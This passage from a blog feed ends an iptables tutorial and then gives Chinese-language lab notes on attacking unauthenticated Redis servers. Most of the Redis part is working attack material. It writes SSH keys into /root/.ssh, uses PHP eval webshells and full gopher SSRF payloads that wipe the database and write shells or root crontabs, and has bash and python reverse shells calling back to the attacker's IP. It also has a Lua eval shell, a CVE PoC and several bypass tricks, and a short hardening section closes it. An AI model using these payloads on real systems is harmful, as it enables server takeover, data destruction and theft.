src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_3.png"></p><p><strong>pkts</strong>:对应规则匹配到的报文的个数。</p><p><strong>bytes</strong>:对应匹配到的报文包的大小总和。</p><p><strong>target</strong>:规则对应的target，往往表示规则对应的”动作”，即规则匹配成功后需要采取的措施。</p><p><strong>prot</strong>:表示规则对应的协议，是否只针对某些协议应用此规则。</p><p><strong>opt</strong>:表示规则对应的选项。</p><p><strong>in</strong>:表示数据包由哪个接口(网卡)流入，我们可以设置通过哪块网卡流入的报文需要匹配当前规则。</p><p><strong>out</strong>:表示数据包由哪个接口(网卡)流出，我们可以设置通过哪块网卡流出的报文需要匹配当前规则。</p><p><strong>source</strong>:表示规则对应的源头地址，可以是一个IP，也可以是一个网段。</p><p><strong>destination</strong>:表示规则对应的目标地址。可以是一个IP，也可以是一个网段。</p><p>上图中的源地址与目标地址都为anywhere，看来，iptables默认为我们进行了名称解析，但是在规则非常多的情况下如果进行名称解析，效率会比较低，所以，在没有此需求的情况下，我们可以<strong>使用-n选项，表示不对IP地址进行名称反解，直接显示IP地址</strong>，示例如下。</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -nvL</span><br></pre></td></tr></table></figure><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_4.png"></p><p>如上图所示，规则中的源地址与目标地址已经显示为IP，而非转换后的名称。</p><p>使用<code>--line-numbers</code> 即可显示规则的编号</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826224157.png" alt="image-20200826224155655"></p><p>如图，每个链的后面都有一个括号，括号后面有一些信息：</p><p><strong>policy</strong>表示当前链的默认策略，policy ACCEPT表示上图中INPUT的链的默认动作为ACCEPT</p><p><strong>packets</strong>表示当前链（上例为INPUT链）默认策略匹配到的包的数量，0 packets表示默认策略匹配到0个包。</p><p><strong>bytes</strong>表示当前链默认策略匹配到的所有包的大小总和。</p><p>其实，我们可以把packets与bytes称作”计数器”，上图中的计数器记录了默认策略匹配到的报文数量与总大小，”计数器”只会在使用-v选项时，才会显示出来。</p><p>如果要查看更精确的计数值，可以使用<code>-x</code>选项。</p><h1 id="Iptables-规则管理"><a href="#Iptables-规则管理" class="headerlink" title="Iptables 规则管理"></a>Iptables 规则管理</h1><p><a href="http://www.zsythink.net/archives/1517">http://www.zsythink.net/archives/1517</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考资料： &lt;/p&gt;
&lt;p&gt;(内容和图片)&lt;/p&gt;
&lt;p&gt;全教程系列&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.zsythink.net/archives/tag/iptables/&quot;&gt;iptables 入门系列&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="运维知识" scheme="https://hack-for.fun/categories/%E8%BF%90%E7%BB%B4%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="iptables" scheme="https://hack-for.fun/tags/iptables/"/>
    
  </entry>
  
  <entry>
    <title>Redis 安全学习笔记</title>
    <link href="https://hack-for.fun/c10c5ca9.html"/>
    <id>https://hack-for.fun/c10c5ca9.html</id>
    <published>2020-06-27T01:58:53.000Z</published>
    <updated>2020-10-30T12:57:36.958Z</updated>
    
    <content type="html"><![CDATA[<p>最近放出来的文章都是以前早就总结好的了。</p><h1 id="Redis-安全学习笔记"><a href="#Redis-安全学习笔记" class="headerlink" title="Redis 安全学习笔记"></a>Redis 安全学习笔记</h1><p><a href="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ"><img src="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ/badge" alt="hackmd-github-sync-badge"></a></p><p>[TOC]</p><p>实战环境下，感觉Redis 未授权非常常见，而我之前只知道怎么利用别人的写好的工具去解CTF，没有去研究过原理，遂在端午节来研究一波！</p><h2 id="Redis-介绍"><a href="#Redis-介绍" class="headerlink" title="Redis 介绍"></a>Redis 介绍</h2><p>Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。</p><blockquote><p>Redis 下载地址：<a href="http://download.redis.io/releases/">http://download.redis.io/releases/</a></p></blockquote><h2 id="RESP-协议介绍"><a href="#RESP-协议介绍" class="headerlink" title="RESP 协议介绍"></a>RESP 协议介绍</h2><p>Redis服务器与客户端通过RESP（REdis Serialization Protocol）协议通信。<br>RESP协议是在Redis 1.2中引入的，但它成为了与Redis 2.0中的Redis服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。<br>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p><p>RESP在Redis中用作请求 - 响应协议的方式如下：</p><p>客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。<br>服务器根据命令实现回复一种RESP类型。<br>在RESP中，某些数据的类型取决于第一个字节：<br>对于Simple Strings，回复的第一个字节是+<br>对于error，回复的第一个字节是-<br>对于Integer，回复的第一个字节是:<br>对于Bulk Strings，回复的第一个字节是$<br>对于array，回复的第一个字节是*<br>此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。<br>在RESP中，协议的不同部分始终以”\r\n”(CRLF)结束。</p><p><a href="https://xz.aliyun.com/t/5665#toc-0">https://xz.aliyun.com/t/5665#toc-0</a></p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><h3 id="未授权漏洞"><a href="#未授权漏洞" class="headerlink" title="未授权漏洞"></a>未授权漏洞</h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下（默认配置），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>Redis因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对Redis未授权访问的一种新型攻击方式，在特定条件下，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器，可导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。　　部分服务器上的Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），以及该端口可以通过公网直接访问，如果没有采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，可能造成其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。　　目前比较主流的案例：yam2 minerd 挖矿程序，还有在多次应急事件中发现大量的watch-smartd挖矿木马。</p><p>简单说，漏洞的产生条件有以下两点：</p><p>（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；</p><p>（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。</p><p>(3) root 身份运行redis</p><p>主流案例图示<br>主流案例图示</p><p>写公钥只是其中一种，还可以写webshell ，crontab 反弹shell，来getshell。<br><img src="https://i.imgur.com/p9JFoqk.png"></p><p>以及其他漏洞场景，下面逐一介绍和复现。</p><h3 id="主从复制-RCE"><a href="#主从复制-RCE" class="headerlink" title="主从复制 RCE"></a>主从复制 RCE</h3><p>Redis主从复制介绍<br>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>漏洞出现的背景<br>随着现代的服务部署方式的不断发展，组件化成了不可逃避的大趋势，docker就是这股风潮下的产物之一，而在这种部署模式下，一个单一的容器中不会有除redis以外的任何服务存在，包括ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下，我们就需要其他的利用手段了</p><p>漏洞原理<br>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。</p><p>然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="复现准备"><a href="#复现准备" class="headerlink" title="复现准备"></a>复现准备</h3><p>安装Redis</p><p>sudo apt-get update # 更新apt 包<br>sudo apt-get install redis-server # 安装Redis<br>service redis-server start # 开启Redis 服务（ 经过复现，这种模式下，是以redis身份运行的redis 服务<br>redis-cli # 进入Redis 命令行模式</p><p>复现环境<br><img src="https://i.imgur.com/2VYBQlt.png"></p><p>网络环境：NAT</p><p>攻击机：Kali Linux：192.168.118.129</p><p>靶机：Ubuntu 18.04 ：192.168.118.142</p><p>Redis 连接命令<br>redis-cli -h 127.0.0.1 -p 6379<br>解决Redis 无法远程连接：<a href="https://blog.csdn.net/qq_41507845/article/details/80967282">https://blog.csdn.net/qq_41507845/article/details/80967282</a></p><p>修改redis 配置文件: Ubuntu 在 /etc/redis/redis.conf</p><p>#bind 127.0.0.1<br>redis在开放往外网的情况下(默认配置是bind 127.0.0.1，只允许本地访问，如果配置了其他网卡地址那么就可以网络访问)，默认配置下是空口令，端口为6379。</p><p>Protected-mode no<br>redis3.2版本后新增protected-mode配置，默认是yes，即开启。设置外部网络连接redis服务，设置方式如下：<br>1、关闭protected-mode模式，此时外部网络可以直接访问<br>2、开启protected-mode保护模式，需配置bind ip或者设置访问密码</p><h3 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h3><p>对靶机进行全端口扫描：<br><img src="https://i.imgur.com/OiedL9z.png"></p><p>发现对外开启6379 redis 服务。获取redis 详细信息</p><p>nmap -A -p 6379 -script redis-info 192.168.118.142<br><img src="https://i.imgur.com/LVfNqbh.png"></p><p>尝试远程连接受害者redis 服务。</p><p>redis-cli -h 192.168.118.142 -p 6379</p><p>成功连上，执行命令ping , 如果回显PONG 则表示远程登录成功。</p><p>执行info 命令，在redis 2.8 以后可以看到redis 配置文件的物理路径：<br><img src="https://i.imgur.com/Ks7zBDv.png"></p><p>Ubuntu 下为：/etc/redis/redis.conf</p><p>CentOs 下为：/etc/redis.conf</p><p>场景一：利用redis 写入ssh key 远程登录靶机ssh<br>原理就是在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以再服务器端的/root/.ssh下生一个授权的key。</p><p>条件：</p><p>靶机以root 身份启动redis 服务<br>redis 认证无密码或者弱口令<br>服务器开启ssh服务，并允许以密钥登录 ，开启ssh 服务：<a href="https://blog.csdn.net/jackghq/article/details/54974141">https://blog.csdn.net/jackghq/article/details/54974141</a><br>攻击机：</p><p>生成ssh key<br>ssh-keygen -t rsa<br><img src="https://i.imgur.com/V8qwFVy.png"></p><p>这里使用\n\n 前后换行，是为了避免和redis 其他缓存的数据混淆。</p><p>将生成的key.txt 写入靶机的缓冲里<br>cat /root/.ssh/key.txt | redis-cli -h 192.168.118.142 -x set evil_ssh_key</p><p>这里出现报错，不知道是不是版本问题还是执行的命令有问题，Google 解决：</p><p><a href="https://www.jianshu.com/p/3aaf21dd34d6">https://www.jianshu.com/p/3aaf21dd34d6</a></p><p>原因：强制关闭redis 快照导致不能持久化。</p><p>在靶机上redis 执行（所以我感觉这次复现算是失败了，实际环境怎么可能呢，</p><p>127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no<br>当我正准备写的时候，发现permission denied。原因：靶机redis 不是以root 身份运行，说不定上一个报错，同样也是这个原因。</p><p>将permission deied的问题去搜索。发现已有人踩过坑。</p><p><a href="https://airycanon.me/jie-jue-redis-de-getshell-yin-qi-de-bgsave-cuo-wu/">https://airycanon.me/jie-jue-redis-de-getshell-yin-qi-de-bgsave-cuo-wu/</a></p><p><img src="https://i.imgur.com/o04V2rM.png"></p><p>果然，查看进程发现，redis 不是以root 身份登录的。而且上面那个修改为no，只是不报错，问题其实也并没有解决。这里通过以root权限使用配置文件启动redis-server 即可。（原因是高版本redis，默认以redis 身份运行的</p><ol><li>设置redis 备份路径为/root/.ssh , 这样可以写入我们的evil_ssh_key<br>config set dir /root/.ssh   # 如果报错，说明靶机没有登录过ssh。执行 ssh localhost 即可</li><li>设置保存文件名为 authorized_keys<br>config set dbfilename authorized_keys</li><li>保存，数据写入dir 目录下的 dbfilename 中<br>save</li><li>ssh 连接即可getshell<br>dir: The DB will be written inside this directory, with the filename specified above using the ‘dbfilename’ configuration directive.<br>dbfilename: The filename where to dump the DB</li></ol><p>/etc/redis/redis.conf</p><p><img src="https://i.imgur.com/NQONHXo.png"></p><p>方法二：生成符合RESP 格式的payload ，利用 ssrf(gopher 协议) + curl 打。<br>这里不做复现。</p><h4 id="场景二：利用redis-写入webshell"><a href="#场景二：利用redis-写入webshell" class="headerlink" title="场景二：利用redis 写入webshell"></a>场景二：利用redis 写入webshell</h4><p>直接写 webshell<br>192.168.118.142:6379&gt; config set dir /var/www/html<br>OK<br>192.168.118.142:6379&gt; set xxx “\n\n\n<?php @eval($_POST[a];?>\n\n\n”<br>OK<br>192.168.118.142:6379&gt; config set dbfilename webshell.php<br>OK<br>192.168.118.142:6379&gt; save<br>OK<br>192.168.118.142:6379&gt;<br>使用蚁剑发现无法连接。不过在靶机上确实可以看到文件写入了。</p><p>解决Apache 不解析 php ：sudo apt-get install libapache2-mod-php7.2<br><img src="https://i.imgur.com/tCHcAkz.png"></p><p>直接访问，返回500。可以看到文件内容有点奇怪。试试flushall全部删掉，重新写webshell 。果然，成功连接webshell。</p><p>FLUSHALL命令可以清空一个Redis实例中所有数据库中的数据</p><p>192.168.118.142:6379&gt; flushall<br>OK<br>192.168.118.142:6379&gt; config get dir</p><ol><li>“dir”</li><li>“/var/www/html”</li><li>168.118.142:6379&gt; config set dir /var/www/html/<br>OK</li><li>168.118.142:6379&gt; config get dbfilename</li><li>“dbfilename”</li><li>“webshell.php”</li><li>168.118.142:6379&gt; config set dbfilename shell.php<br>OK</li><li>168.118.142:6379&gt; set webshell “<?php eval($_POST[a]);?>“<br>OK</li><li>168.118.142:6379&gt; save<br>OK</li><li>168.118.142:6379&gt; </li></ol><p><img src="https://i.imgur.com/qApD7Ir.png"></p><p>这个成功连上去，是www-data权限。所以没有ssh 直接是root权限（因为ssh利用方式，是root启动redis，root登录ssh。不过问题不大，拿到webshell 了，至少渗透也就成功了一半了。</p><p>不过真实渗透不可能让你执行flushall的，数据最重要。</p><p>SSRF 写入 WebShell<br>curl + 下面的payload</p><p>gopher://192.168.118.142:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<br><img src="https://i.imgur.com/UDjp6GH.png"></p><h4 id="场景三：利用redis-写入crontab-反弹shell"><a href="#场景三：利用redis-写入crontab-反弹shell" class="headerlink" title="场景三：利用redis 写入crontab 反弹shell"></a>场景三：利用redis 写入crontab 反弹shell</h4><p>看网上已经复现的师傅的文章，ubuntu 利用定时任务反弹shell 几乎不成，利用python 反弹有时候可以成功。CentOS 可以成功。<br><img src="https://i.imgur.com/P5uZdwM.png"></p><p>这里就用yulige 文章中的版本：CentOS 6.7</p><p>原理也是利用 未授权通过 CONFIG 和 set 等命令来写定时任务，简单的换了一下物理路径(根据OS的不同，定时任务的文件目录不同)。然后当靶机执行定时任务时，即可反弹shell。</p><p>CentOS 定时任务：/var/spool/cron/<username></p><p>Ubuntu 定时任务：/var/spool/cron/crontabs/<username></p><p>bash 反弹<br>Payload:</p><p>payload经过url 编码后，在存在SSRF的漏洞点即可反弹shell。</p><p>gopher://<target_ip>:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<br>nc -lvp 1234</p><p>远程登录了redis，执行一下即可，和写 ssh key 一样。crontab 最小执行单位为1分钟</p><p>flushall # 谨慎使用！（本地测试可以，实际渗透可能没这个命令，有也不要用<br>set reshell “\n\n* * * * * bash -i &gt; &amp; /dev/tcp/192.168.118.129/2333 0&gt;&amp;1\n\n”<br>config set dirr /var/spool/cron/<br>config set dbfilename root<br>save<br>nc -lvp 2333</p><p>python 反弹<br>\n\n * * * * * python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.118.129”,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’\n\n</p><h4 id="场景四：主从复制RCE"><a href="#场景四：主从复制RCE" class="headerlink" title="场景四：主从复制RCE"></a>场景四：主从复制RCE</h4><p>影响版本：Redis 4.x/5.x (&lt;= 5.0.5)<br>漏洞类型：RCE<br>利用条件：未授权或者弱口令外网访问redis 服务<br>攻击思路：来自参考资料。</p><p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><p><img src="https://i.imgur.com/cLoUGX3.png"></p><p>redis 5.0:</p><p>redis 5.0 不允许在脚本中执行命令，即 不能使用CONFIG 命令去设置或者获取数据库的物理路径，但是我们仍然可以猜测dbfilename 。 PPT 作者给出了一种攻击思路：</p><p><img src="https://i.imgur.com/SeNIJDt.jpg"></p><p>redis 通过slaveof 设置主从状态。主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。</p><p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p><p>复现过程<br>启动一个redis 5.0 的镜像<br><a href="https://www.runoob.com/docker/docker-install-redis.html">https://www.runoob.com/docker/docker-install-redis.html</a></p><p><img src="https://i.imgur.com/rUwcW6f.png"></p><p>启动一个Redis Rogue Server<br>在使用之前，将恶意so 文件下载到.py 文件同目录下。</p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>默认的端口为 6379 默认vps 端口为21000<br><img src="https://i.imgur.com/lWGmVLx.png"></p><p>这里我打了几次都是timeout。用kali 确信是可以直接远程连接我的vps 的redis服务的。这里是环境问题（腾讯云），网上也有些师傅没复习成功，后来用vps 复现成功了。</p><p>关于主从复制RCE，原理更重要，其实打就是用别人的工具……</p><h4 id="场景五：Lua-RCE"><a href="#场景五：Lua-RCE" class="headerlink" title="场景五：Lua RCE"></a>场景五：Lua RCE</h4><p>CVE-2015-4335</p><p>影响版本：Redis before 2.8.21 and 3.x before 3.0.2</p><p>漏洞危害：远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码</p><p>Exploit: <a href="https://github.com/QAX-A-Team/redis_lua_exploit/blob/master/redis_lua.py">https://github.com/QAX-A-Team/redis_lua_exploit/blob/master/redis_lua.py</a></p><p>将147 行的 host 改为目标机器ip。</p><p>获取反弹shell。</p><p>eval “tonumber(‘/bin/bash -i &gt;&amp; /dev/tcp/192.168.91.1/2333 0&gt;&amp;1’, 8)” 0</p><h4 id="场景六：缓冲区溢出-RCE"><a href="#场景六：缓冲区溢出-RCE" class="headerlink" title="场景六：缓冲区溢出 RCE"></a>场景六：缓冲区溢出 RCE</h4><p>CVE-2016-8339</p><p>受影响的版本 3.2.x - 3.2.4</p><p>漏洞类型：数组越界（数组下标越界导致溢出</p><p>涉及二进制，参考：<a href="https://bestwing.me/Redis-CVE-2016-8339-analysis.html">https://bestwing.me/Redis-CVE-2016-8339-analysis.html</a></p><p>POC：config set client-output-buffer-limit “master 1094795585 1094795585 1094795585”</p><h2 id="绕过-截断"><a href="#绕过-截断" class="headerlink" title="绕过 ? 截断"></a>绕过 ? 截断</h2><p>以下内容均转载自yulige的博客</p><p>转义绕过<br>写入恶意代码：（&lt;? 等特殊符号需要转义，不然问号后面会导致截断无法写入）<br>dict://0:6379/set:shell:”\x3C\x3Fphp\x20echo$_GET[x]\x3B\x3F\x3E”</p><p><a href="https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ">https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ</a><br><img src="https://i.imgur.com/je6ovIe.png"></p><h3 id="主从复制绕过"><a href="#主从复制绕过" class="headerlink" title="主从复制绕过"></a>主从复制绕过</h3><p><a href="http://yulige.top/?p=775#i-17">http://yulige.top/?p=775#i-17</a></p><p>当？截断的时候可以使用主从复制的方法将key值从主节点复制过来。然后节点再执行备份数据库操作写入webshell。</p><p>主节点</p><p>127.0.0.1:4444&gt; set shell “”<br>OK<br>节点</p><p>dict://0:6379/slaveof:127.0.0.1:4444<br>dict://0:6379/config:set:dir:/var/www/html<br>dict://0:6379/config:set:dbfilename:shell.php<br>dict://0:6379/save<br>dict://0:6379/slaveof:no:one<br>查看一下文件是成功写入shell了。</p><p>当然了如果可以出外网也可以直接主从复制rce，这一点在前面就说过了。只要用python起一个服务去模拟redis的返回，并且在全量复制的时候把数据库文件替换成so文件即可。</p><p>bitop 命令绕过<br>zer0pts CTF 2020 urlapp ：<a href="https://hackmd.io/@theoldmoon0602/r1mltAWHL">https://hackmd.io/@theoldmoon0602/r1mltAWHL</a><br><img src="https://i.imgur.com/VW73I1v.png"></p><p>该命令可将key 进行位运算，取结果进行保存。</p><p>bitop 命令的详细文档：<a href="https://redis.io/commands/bitop">https://redis.io/commands/bitop</a></p><p>Available since 2.6.0.</p><p>Time complexity: O(N)</p><p>Perform a bitwise operation between multiple keys (containing string values) and store the result in the destination key.</p><p>The BITOP command supports four bitwise operations: AND, OR, XOR and NOT, thus the valid forms to call the command are:</p><p>BITOP AND destkey srckey1 srckey2 srckey3 … srckeyN<br>BITOP OR destkey srckey1 srckey2 srckey3 … srckeyN<br>BITOP XOR destkey srckey1 srckey2 srckey3 … srckeyN<br>BITOP NOT destkey srckey<br>image-20200627173823931<br>image-20200627173823931</p><h3 id="setbit-命令绕过"><a href="#setbit-命令绕过" class="headerlink" title="setbit 命令绕过"></a>setbit 命令绕过</h3><p>既然想明白关键是?截断的话其实方法也很多，能操作key就可以。这里举出一个command setbit.</p><p><a href="https://www.runoob.com/redis/strings-setbit.html">https://www.runoob.com/redis/strings-setbit.html</a></p><p>Redis Setbit 命令用于对 key 所储存的字符串值，设置或清除指定偏移量上的位(bit)。</p><p>?的ascii是63，ascii62是&gt;，二进制分别是0b00011111和0b00011110。所以按照前面的payload稍微改一下就是.使用setbit改动一位二进制即可把字符变成?，从而可写入webshell。</p><p>127.0.0.1:6379&gt; config set dir /var/www/html<br>OK<br>127.0.0.1:6379&gt; config set dbfilename shell.php<br>OK<br>127.0.0.1:6379&gt; set webshell “&lt;&gt;php @eval($_POST[1]);&gt;&gt;”<br>OK<br>127.0.0.1:6379&gt; setbit webshell 191 1<br>(integer) 0<br>127.0.0.1:6379&gt; setbit webshell 15 1<br>(integer) 0<br>127.0.0.1:6379&gt; save<br>OK<br>Windows 下Redis GetShell</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>我们可以通过 redis 的配置文件设置密码参数，这样客户端连接到 redis 服务就需要密码验证，这样可以让你的 redis 服务更安全。</p><p>我们可以通过以下命令查看是否设置了密码验证：</p><p>127.0.0.1:6379&gt; CONFIG get requirepass</p><ol><li>“requirepass”</li><li>“”<br>默认情况下 requirepass 参数是空的，这就意味着你无需通过密码验证就可以连接到 redis 服务。</li></ol><p>你可以通过以下命令来修改该参数：</p><p>127.0.0.1:6379&gt; CONFIG set requirepass “runoob”<br>OK<br>127.0.0.1:6379&gt; CONFIG get requirepass</p><ol><li>“requirepass”</li><li>“runoob”<br>设置密码后，客户端连接 redis 服务就需要密码验证，否则无法执行命令。</li></ol><p>AUTH 命令基本语法格式如下：</p><p>127.0.0.1:6379&gt; AUTH password<br>127.0.0.1:6379&gt; AUTH “runoob”<br>OK<br>127.0.0.1:6379&gt; SET mykey “Test value”<br>OK<br>127.0.0.1:6379&gt; GET mykey<br>“Test value”<br>修改默认配置，设置访问密码为强密码。<br>port 修改redis使用的默认端口号</p><p>bind 设定redis监听的专用IP</p><p>requirepass 设定redis连接的密码</p><p>rename-command CONFIG “”　 ＃禁用CONFIG命令</p><p>rename-command info info2 #重命名info为info2</p><p>设置防火墙策略，添加访问redis 白名单。<br>iptables -A input -s x.x.x.x -p tcp –dport 6379 -j ACCEPT<br>权限最小原则。<br>以低权限用户启动redis 服务</p><p>禁用/重命名高危命令，如config , flushall, eval<br>redis 不暴露公网 bind 127.0.0.1 , protected-mode yes<br>修改authorized_keys文件的权限对拥有者只读，其他用户无权限<br>相关资料<br><a href="https://blog.csdn.net/qq_41507845/article/details/80967282">https://blog.csdn.net/qq_41507845/article/details/80967282</a> 解决无法远程连接Redis</p><p><a href="https://www.cnblogs.com/linjiqin/p/8608975.html">https://www.cnblogs.com/linjiqin/p/8608975.html</a> 复习一下docker</p><p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</a> Crontab</p><p><a href="https://www.cnblogs.com/kismetv/p/9236731.html#t2">https://www.cnblogs.com/kismetv/p/9236731.html#t2</a> Redis 主从复制学习</p><p><a href="http://yulige.top/?p=775#_RCE">http://yulige.top/?p=775#_RCE</a> 一篇总结非常好并且全面的Redis 安全博文</p><p>[<a href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/]">https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/]</a>(<a href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1">https://www.k0rz3n.com/2019/07/29/对一次</a> redis 未授权写入攻击的分析以及 redis 4.x RCE 学习/) 也是一篇超级棒的文章</p><p><a href="https://www.freebuf.com/column/158065.html">https://www.freebuf.com/column/158065.html</a> 未授权攻击Redis</p><p><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a> 主从复制攻击手法原理pdf</p><p><a href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a> 主从复制攻击Redis</p><p><a href="https://mntn0x.github.io/2019/08/02/Redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E7%8E%B0%E7%9A%84RCE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://mntn0x.github.io/2019/08/02/Redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E7%8E%B0%E7%9A%84RCE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p><p><a href="https://zhuanlan.zhihu.com/p/113116872">https://zhuanlan.zhihu.com/p/113116872</a></p><p><a href="https://joychou.org/web/phpssrf.htmld">https://joychou.org/web/phpssrf.htmld</a> SSRF</p><p><a 